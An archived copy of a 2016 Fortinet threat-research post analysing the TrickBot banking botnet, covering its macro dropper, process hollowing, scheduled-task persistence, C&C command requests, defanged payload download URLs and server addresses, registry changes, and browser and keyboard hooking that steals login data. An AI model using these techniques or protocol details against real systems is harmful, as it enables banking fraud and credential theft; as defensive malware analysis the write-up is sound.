{
    "id": "beef044f-9008-479f-9b08-8025f6571618",
    "created_at": "2023-01-12T15:00:43.430147Z",
    "updated_at": "2025-03-27T02:05:48.13922Z",
    "deleted_at": null,
    "sha1_hash": "bc39a6b71d4f32d64fc144f9e2a97e85994723a9",
    "title": "2016-12-06 - Deep Analysis of the Online Banking Botnet TrickBot",
    "authors": "",
    "file_creation_date": "2022-05-29T10:40:27Z",
    "file_modification_date": "2022-05-29T10:40:27Z",
    "file_size": 1885485,
    "plain_text": "# Deep Analysis of the Online Banking Botnet TrickBot\n\n**[blog.fortinet.com/2016/12/06/deep-analysis-of-the-online-banking-botnet-trickbot](http://blog.fortinet.com/2016/12/06/deep-analysis-of-the-online-banking-botnet-trickbot)**\n\nDecember 6, 2016\n\nThreat Research\n\nBy [Xiaopeng Zhang | December 06, 2016](http://blog.fortinet.com/blog/search?author=Xiaopeng+Zhang)\n\nOne month ago we captured a Word document infected with malicious VBA code, which was\ndetected as WM/Agent!tr by the Fortinet AntiVirus service. Its file name is InternalFax.doc,\nand its MD5 is `4F2139E3961202B1DFEAE288AED5CB8F . By our analysis, the Word`\ndocument was used to download and spread the botnet TrickBot. TrickBot aims at stealing\nonline banking information from browsers when victims are visiting online banks. The\ntargeted banks are from Australia, New Zealand, Germany, United Kingdom, Canada, United\nStates, Israel, and Ireland, to name a few.\n\n**How TrickBot is downloaded to the victim’s system**\n\nWhen a victim opens the malicious Word document, Figure 1 shows what the document\nlooks like:\n\n\n-----\n\nFigure 1. The Word document is opened\n\nAs you can see, a warning message is shown in the foreground. However, in the\nbackground, its VBA code is downloading the TrickBot sample from hxxp://faxdownload.com/lindoc1.exe or hxxp://futuras.com/dodocdoddus.exe. Figure 2, below, shows\nthe downloaded TrickBot sample. Its MD5 is `D58CD6A8D6632EDCB6D9354FB094D395, and`\ncan be detected as W32/Generik.LWVNLMZ!tr by Fortinet AntiVirus service.\n\nFigure 2. The downloaded TrickBot sample\n\n**TrickBot is installed on victim’s system**\n\nThe original TrickBot is a program developed with Visual Basic 6.0. To increase the difficulty\nof debugging and analyzing it, the malware developer used a large number self-defense\ntechniques, including code self-modification, code dynamic-extraction, and code/data\nencryption, etc. Let’s go ahead and see how it works.\n\nWhen TrickBot is launched it dynamically extracts code from itself, puts it into a heap space,\nthen calls its entry point. The main purpose is to call the Windows API `CreateProcessW` to\nrun as a child process with the creation flag “CREATE_SUSPENDED.” This means that\nwhen the new process is created successfully, it’s in suspended status. So the malware\ncould get a chance to modify the child process’ code as expected, then send the child\nprocess a signal by calling an API to let it resume and run the modified code. This is usually\nwhat the malware does to protect its code. Figure 3 shows the calling of the API\nCreateProcessW.\n\n\n-----\n\nFigure 3. Call CreateProcessW with CREATE_SUSPENDED flag\n\nAs mentioned above, it’ll call `ZwUnmapViewOfSection, ZwAllocateVirtualMemory,`\n```\nZwWriteVirtualMemory, ZwGetContextThread, ZwSetContextThread and\n\n```\n`ZwResumeThread` APIs to modify the child process’ code. It then modifies the thread context\nand finally resumes its execution. After that, the parent process finishes its job and is going\nto exit soon. From now on, the code in the child process will take over and continue the\nTrickBot’s job.\n\nLet’s move on and see how the child process works.\n\nActually, the child process is a loader, which loads a named resource from itself into heap\nspace. Of course, the content of the resource is encrypted, but after decryption it appears as\nan executable code block. Soon the child process will call the executable’s entry point. The\nnamed resource is “IDR_X86BOT” or “IDR_X64BOT.” It depends on whether the victim’s\nsystem is 32-bit or 64-bit. In our analysis, according to the system type, the named resource\nis “IDR_X86BOT”. This also affects what executable files are downloaded from the C&C\nserver later.\n\nThe code in heap contains the main job of the child process. At first it creates a named\nmutex object by calling the function `CreateMutex . This is used to check if another`\nlindoc1.exe is running. If yes, it stops doing other things and exits the process. In this way, it\ncan ensure that only one lindoc1.exe can be run at one time. The following ASM code\nsnippet shows how the named mutex object is created.\n\n\n-----\n\nNext, TrickBot tries to add itself as a task named “Bot” to the Task Scheduler, so that the\nTrickBot can be executed in a timely manner. Figure 4 and 5 show the screenshots of\nTrickBot’s task in Task Scheduler.\n\n\n-----\n\nFigure 4. New Task “Bot” in Task Scheduler\n\nFigure 5. The action of the TrickBot task\n\nThe task named “Bot” is able to start “lindoc1.exe” with “SYSTEM” account permission. As\nyou might notice, the original “lindoc1.exe” has been moved to\n“C:\\Windows\\system32\\config\\systmprofile\\AppData\\Roaming\\lindoc1.exe” because this\nfolder is just like “%AppData%” for local “SYSTEM” account.\n\nTrickBot creates a security identity (SID) to check if the user running this process is\n“SYSTEM”. If not, then it will soon exit the process. See the following code snippet for\ndetailed info on how it checks the account.\n\n\n-----\n\nOf course, the current account is owned the user who signed into Windows, and not\n“SYSTEM.” As you may recall, only when TrickBot is executed by the Task Scheduler, the\naccount is “SYSTEM” (see Figure 4.) So the child process exits itself without doing any\nfurther things.\n\n\n-----\n\n**TrickBot is executed by Task Scheduler**\n\nWhen TrickBot is executed by the Task Scheduler with “SYSTEM” account permission, it can\npass the SID check. It then tries to get victim’s public IP address by sending following HTTP\nrequests.\n\nThe public IP address will be used for communication with C&C server later.\n\nIt should be noted that most of the data, meaning files generated by TrickBot, are encrypted.\nTrickBot continually loads encrypted resource data with the name “CONFIG.” After\ndecryption, it contains some information about TrickBot, including its version, group tag, and\nthe IP addresses of its C&C servers. All this information is used to communicate with its C&C\nservers. If there is already a “config.conf” file, it reads the file and decrypts it to get the\n“CONFIG” data instead. The content looks like this:\n\n\n-----\n\nAfter the IP addresses of C&C servers are received, TrickBot will connect them. I’m going to\ntake one request as an example to show you what the command looks like:\n\n_GET /lindoc1/AAA-PC_W617600.CA836C89ADF141D19A16BFA7397AD021/5/spk/_\n\n“lindoc1” is the group tag.\n“AAA-PC_W617600.CA836C89ADF141D19A16BFA7397AD021” is the client id that is\ngenerated by current user name, Windows version and 32 random hexadecimals.\n“5” is the command id. According to my analysis, command 5 is used to request\ndownloading something from the C&C server, so the server will reply with data to this\ncommand.\n“spk” is an additional information for command 5.\n\nNext, I’m going to show the requests and responses of some main commands in\nchronological order. In the requests I use “Client_ID” to replace the real long client id in order\nto reduce the request length. Note that the response data are all encrypted, so I decrypted\nthem here for readability.\n\n**[Command 0 request]:**\n\n\n-----\n\n```\nGET /lindoc1/Client_ID/0/Windows7x86/1012/PUBLIC\n\n```\n```\nIP/BC1A53480DD53727D4E197BC8DF20B0E8D113AA14C\n\n```\n\nThis provides the C&C server with the Windows version, and the public IP address of the\nvictim’s machine. The server then replies with an expiration time and new IP address, which\nare used to download DLLs later.\n\n[Response]:\n\n“1480550400” is a date/time value. After conversion it’s “16:00 11/30 2016.” It tells us the\nC&C server’s expiration date and time. The IP address and port “37.1.213.189:447” points to\na specific C&C server that holds the DLL files.\n\n**[Command 23 request]:**\n\n```\nGET /lindoc1/Client_ID /23/1000004/\n\n```\n\nThis sends the TrickBot version to the C&C server to fetch the latest “CONFIG” of the C&C\nserver. When TrickBot runs into any errors in connecting to the C&C server, it’ll send such\nrequest. As you can see, the latest version for now is 1000008. It’s going to replace the\nprevious “CONFIG” data as well. Also, the original response data is saved in (or replaced, if\nit existed) “config.conf,” which is checked first when it’s executed next time.\n\n[Response]:\n\n\n-----\n\n**[Command 5/systeminfo]:**\n\n```\nGET /lindoc1/Client_ID/5/systeminfo32/\n\n```\n\nWhen the victim’s system type is 32 bit, it sends command 5 to download “systeminfo32,” a\n32-bit DLL that is used to steal the victim’s system information. “systeminfo64” is for 64-bit\nsystems. The request is sent to a C&C server, whose IP address and port are obtained from\nCommand 0’s response. In my analysis, it is “37.1.213.189:447.” The encrypted\nsysteminfo32 is saved as “.\\Modules\\systeminfo32.”\n\nLater, it is executed in a newly-created process, “svchost.exe,” which focuses on collecting\nthe victim’s system information, including its Windows version, CPU type, RAM capacity,\nuser accounts, installed software, and services. Here is the system information collected\nfrom my testing system.\n\n\n-----\n\nLater, the data is sent to a C&C server as body part of command 63 POST request, like this:\n\n\n-----\n\n```\nPOST lindoc1/CLIENT_ID/63/systeminfo/GetSystemInfo/c3VjY2Vzcw==/systeminfo\n\n```\n\n\n**[Command 5/injectDll]:**\n\n```\nGET /lindoc1/Client_ID/5/injectDll32/\n\n```\n\nThis is a command 5 “Get” request to download injectDll32 file from the C&C server whose\nIP address comes from Command 0’s response i.e. “37.1.213.189:447.” The encrypted\ninjectDll32 is saved as “.\\Modules\\injectDll32.” In my analysis, this is a very important DLL,\nwhich finally is able to inject malicious code into web browsers (IE, Chrome and Firefox) or to\nmonitor the victim’s online banking. I will explain how it works in a later section.\n\n**[Command 5/sinj]:**\n\n```\nGET /lindoc1/Client_ID/5/sinj/\n\n```\n\nThis is kind of a configuration file for “injectDll”. It contains many online banks. The encrypted\nresponse data is saved in “.\\Modules\\injectDll32_configs\\sinj”.\n\n**[Command 5/dinj]:**\n\n```\nGET /lindoc1/Client_ID/5/dinj/\n\n```\n\nThis command will going to download “dinj” file. It’s another configuration file for “injectDll”\nthat also contains online bank information. It’ll be saved in\n“.\\Modules\\injectDll32_configs\\dinj.”\n\nBelow is an example.\n\n**[Command 5/dpost]:**\n\n\n-----\n\n```\nGET /lindoc1/Client_ID/5/dpost/\n\n```\n\nThis command downloads a dpost file from C&C server, which contains another IP address\nand port that will work together with dinj. When the banks in the dinj file are matched, some\nstolen bank information will be sent to this IP address. It’s also saved as\n“.\\Modules\\injectDll32_configs\\dpost.” The content of this file looks like this:\n\n_hxxp://188.138.1.53:8082_\n\n**[Command 25]:**\n\n```\nGET /lindoc1/Client_ID/25/zm9ew0pP4BD8HxR5zzem/\n\n```\n\nCommand 25 is used to get a new link to a bin file. The bin file is going to be the new version\nof TrickBot. Before exiting this child process, the downloaded bin file will replace the old\nTrickBot and gets executed by calling the CreateProcessW function. In this way it can update\nitself automatically. During my analysis I could see that the downloaded bin has been\nchanged many times. They include:\n\n_hxxp://substan.merahost.ru/fog.bin_\n\n_hxxp://susan.merahost.ru/sonya.bin_\n\n_hxxp://susan.merahost.ru/shevchenko.bin_\n\n_hxxp://susan.merahost.ru/kabzon.bin_\n\n_hxxp://susanlaneg.temp.swtest.ru/kabzon2.bin_\n\n_hxxp://susanlaneg.temp.swtest.ru/peter.bin_\n\n_hxxp://susanlanegh.shn-host.ru/roma.bin_\n\n**How injectDll steals online banking information**\n\nTrickBot keeps updating its config files from time to time. In the latest version of sinj and dinj\nfiles, it tries to steal online bank information from dozens of banks.\n\nWhen injectDll32 is executed by svchost.exe, it enumerates all running processes to check if\nit’s a browser by comparing process names. See the following code snippet for the details.\n\n\n-----\n\n-----\n\nFrom the above code, we know it only focuses on “Chrome”, “IE” and “Firefox” browsers.\nAfter it picks one process it uses the process ID to make a combination with a constant string\nas the name of pipe. This named pipe is then used to communicate between svchost.exe\nand the browser to transfer the content of sinj, dinj and dport. Then injectDll prepares the\ncode that will be injected into browser, and calls `CreateRemoteThread to execute the`\ninjected code. This can be seen in the following code snippet.\n\n\n-----\n\nOn the browser side, it creates several thread functions. One is to communicate with\ninjectDll32 by named pipe, and others are to set Hook functions on some HTTP-related API\nfunctions and the keyboard.\n\nIt also creates the following registry entries, so that IE can be hooked and monitored better:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\2500 =\nDWORD:3\nHKCU \\Software\\Microsoft\\Internet Explorer\\Main\\TabProcGrowth = DWORD:0\nHKCU \\Software\\Microsoft\\Internet Explorer\\Main\\NoProtectedModeBanner =\nDWORD:1\n\nIn thread function1, it sends commands to the svchost.exe by that named pipe, to transfer\nbank information (i.e. the content of sinj, dinj and dpost) to browser. Later in thread function2,\nit is going to set some hooks on WinINet and Nss3 APIs. In this way, the injected code can\ncapture all HTTP requests from the browsers. Then the local hook functions are able to do\nfurther filtering on the HTTP requests with the bank information. If the HTTP request\nmatches the listed banks, this HTTP request will be copied and sent to the C&C server. Let’s\nsee what functions are hooked.\n\n**For WinINet:**\n\n\n-----\n\n**For Nss3:**\n\nFollowing 2 screenshots show the original entry code and the hooked entry code of\n_HttpSendRequestA._\n\nFigure 6. Original entry code of HttpSendRequestA\n\n\n-----\n\nFigure 7. Hooked entry code of HttpSendRequestA\n\nIt also sets a global keyboard hook so that it can monitor and collect the victim’s keyboard\ninput. In this hook function it checks to see if the keyboard input is from the browser controls.\nFigure 8 shows how the global keyboard hook is set.\n\nFigure 8. Set global keyboard hook\n\nI’m going to now provide a real example to explain how the online banking login information\nis stolen, modified, and sent to its C&C server. The example I’ll use is an online bank that is\nfrom sinj. As I understand, “sinj” means static injection and “dinj” is dynamic injection.\n\nHere we go. First, we open IE and go to the login page. Enter testing Customer ID\n“0903670001” and User ID “1234567890,” as shown in Figure 9.\n\n\n-----\n\nFigure 9. Online bank’s login page\n\nWhen we click the “Continue” button, it will send such POST request:\n\nThe data is captured by local hook function of `HttpSendRequestW and later it is modified`\nas this:\n\n\n-----\n\nAs you may have noticed, the strings in green are modified or newly added. The string in\nyellow is the data that I entered on the bank’s login page. It will be sent to the C&C server,\nwhose IP address and port are from command 23’s response.\n\n**TrickBot flow charts**\n\nHere are the flow charts that show how TrickBot is executed on the victim’s machine.\n\n‘\n\nFigure 10. TrickBot is first executed\n\n\n-----\n\nFigure 11. TrickBot is executed by Task Scheduler\n\n**Conclusion**\n\nThrough this analysis, we know how TrickBot installs itself on victim’s machine, and how it\ncommunicates with the C&C server, as well as what and how it steals online banking\ninformation from the victim’s browser, and finally how it upgrades itself from time to time.\n\nFortinet has published an IPS signature, “Trick.Botnet” to detect the communication between\nTrickBot and its C&C servers.\n\n## Related Posts\n\nCopyright © 2022 Fortinet, Inc. All Rights Reserved\n\n[Terms of ServicesPrivacy Policy](https://www.fortinet.com/corporate/about-us/legal.html)\n| Cookie Settings\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-12-06 - Deep Analysis of the Online Banking Botnet TrickBot.pdf"
    ],
    "report_names": [
        "2016-12-06 - Deep Analysis of the Online Banking Botnet TrickBot.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535643,
    "ts_updated_at": 1743041148,
    "ts_creation_date": 1653820827,
    "ts_modification_date": 1653820827,
    "files": {
        "pdf": "https://archive.orkl.eu/bc39a6b71d4f32d64fc144f9e2a97e85994723a9.pdf",
        "text": "https://archive.orkl.eu/bc39a6b71d4f32d64fc144f9e2a97e85994723a9.txt",
        "img": "https://archive.orkl.eu/bc39a6b71d4f32d64fc144f9e2a97e85994723a9.jpg"
    }
}